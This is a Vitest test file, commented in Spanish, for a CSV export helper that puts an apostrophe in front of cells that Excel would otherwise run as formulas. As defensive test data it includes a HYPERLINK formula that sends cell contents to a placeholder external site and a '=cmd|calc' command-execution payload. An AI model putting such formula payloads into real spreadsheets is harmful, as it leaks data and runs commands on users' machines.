import { describe, it, expect } from 'vitest';
import { campoCSV, filaCSV, generarCSV, neutralizarFormula } from './csv';

describe('neutralizarFormula', () => {
  // El texto de convenios y solicitudes lo escribe una persona y termina en un
  // archivo que se abre en Excel: todo lo que empiece por estos caracteres
  // dejaría de ser texto para pasar a ser una fórmula que se ejecuta sola.
  it.each(['=', '+', '-', '@', '\t', '\r'])('antepone un apóstrofo a lo que empieza por %j', (inicio) => {
    expect(neutralizarFormula(`${inicio}algo`)).toBe(`'${inicio}algo`);
  });

  it('neutraliza el caso clásico de exfiltración por HYPERLINK', () => {
    const ataque = '=HYPERLINK("http://sitio-externo?d="&A1,"Ver informe")';
    expect(neutralizarFormula(ataque).startsWith("'=")).toBe(true);
  });

  it('no toca el texto normal', () => {
    expect(neutralizarFormula('Convenio marco con el Hospital')).toBe('Convenio marco con el Hospital');
    expect(neutralizarFormula('CONV-2026-014')).toBe('CONV-2026-014');
    expect(neutralizarFormula('2026-02-23')).toBe('2026-02-23');
    expect(neutralizarFormula('')).toBe('');
  });

  it('sólo mira el principio: un = en medio no es fórmula', () => {
    expect(neutralizarFormula('Convenio A = Convenio B')).toBe('Convenio A = Convenio B');
  });
});

describe('campoCSV', () => {
  it('entrecomilla y duplica las comillas internas', () => {
    expect(campoCSV('Convenio "marco"')).toBe('"Convenio ""marco"""');
  });

  it('entrecomillar no basta: la fórmula igual se neutraliza', () => {
    // Éste era el problema: el campo salía entrecomillado y parecía seguro,
    // pero Excel evalúa el contenido de la celda igual.
    expect(campoCSV('=1+1')).toBe(`"'=1+1"`);
  });

  it('deja pasar el separador y los saltos de línea dentro de las comillas', () => {
    expect(campoCSV('uno;dos')).toBe('"uno;dos"');
    expect(campoCSV('uno\ndos')).toBe('"uno\ndos"');
  });

  it('null, undefined y números salen como corresponde', () => {
    expect(campoCSV(null)).toBe('""');
    expect(campoCSV(undefined)).toBe('""');
    expect(campoCSV(0)).toBe('"0"');
    expect(campoCSV(42)).toBe('"42"');
  });

  it('un número negativo queda como texto, que es el precio de la defensa', () => {
    expect(campoCSV(-5)).toBe(`"'-5"`);
  });
});

describe('filaCSV', () => {
  it('une los campos con punto y coma', () => {
    expect(filaCSV(['a', 'b'])).toBe('"a";"b"');
  });

  it('acepta otro separador', () => {
    expect(filaCSV(['a', 'b'], ',')).toBe('"a","b"');
  });
});

describe('generarCSV', () => {
  it('arma encabezados y filas con BOM y saltos CRLF', () => {
    const csv = generarCSV(['Nombre', 'Estado'], [['Convenio A', 'Ingresado']]);

    expect(csv.startsWith('﻿')).toBe(true);            // BOM para los acentos en Excel
    expect(csv).toBe('﻿"Nombre";"Estado"\r\n"Convenio A";"Ingresado"');
  });

  it('se puede pedir sin BOM', () => {
    expect(generarCSV(['a'], []).startsWith('﻿')).toBe(true);
    expect(generarCSV(['a'], [], { bom: false })).toBe('"a"');
  });

  it('neutraliza las fórmulas de todas las filas, no sólo de la primera', () => {
    const csv = generarCSV(['Nombre'], [['Normal'], ['=cmd|calc'], ['@SUM(1)']], { bom: false });

    expect(csv).toBe('"Nombre"\r\n"Normal"\r\n"\'=cmd|calc"\r\n"\'@SUM(1)"');
  });

  it('sin filas devuelve sólo el encabezado', () => {
    expect(generarCSV(['Nombre'], [], { bom: false })).toBe('"Nombre"');
  });
});
